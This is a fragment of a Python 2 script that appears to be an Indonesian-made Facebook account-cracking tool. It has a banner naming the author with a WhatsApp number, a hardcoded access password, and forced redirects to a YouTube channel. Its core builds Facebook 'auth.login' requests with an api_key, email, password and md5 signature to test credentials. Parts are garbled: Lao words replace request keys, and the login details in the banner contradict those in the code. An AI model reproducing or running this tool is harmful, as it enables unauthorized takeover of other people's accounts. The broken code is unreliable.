...
os.system("clear")
print "\033[1;96m ============================================================="
print  """\033[1;96m [¤] \x1b[1;93mASSALAMUALAIKUM\x1b[1;96m  \033[1;96m   [¤] \x1b[1;93mWHATSAPP : +8562059498869\x1b[1;96m  
\033[1;96m [¤] \x1b[1;93mSELAMAT DATAMG\x1b[1;96m      [¤] \x1b[1;93mLOGIN SC: UNTUK LOGIN +USERNAME+:RAFLY +PASSWORD+:PAKEI\x1b[1;96m  
\033[1;96m [¤] \x1b[1;93mTOOLS MUHAMMAD RAFLI\x1b[1;96m  [¤] \x1b[1;93mYOUTUBE  : OP SIN76\x1b[1;96m"""
print " \x1b[1;93m============================================================="

CorrectUsername = "FC"
CorrectPassword = "OP SIN76"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            ...
            os.system('xdg-open https://youtube.com/channel/UC_4qBqIo1l0qBXJM7UIQ36w')
    else:
        print "salah sayang!"
        os.system('xdg-open https://youtube.com/channel/UC_4qBqIo1l0qBXJM7UIQ36w')
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"ເຂົ້າຮ່ວມ", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","ເວີຊັ້ນ":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
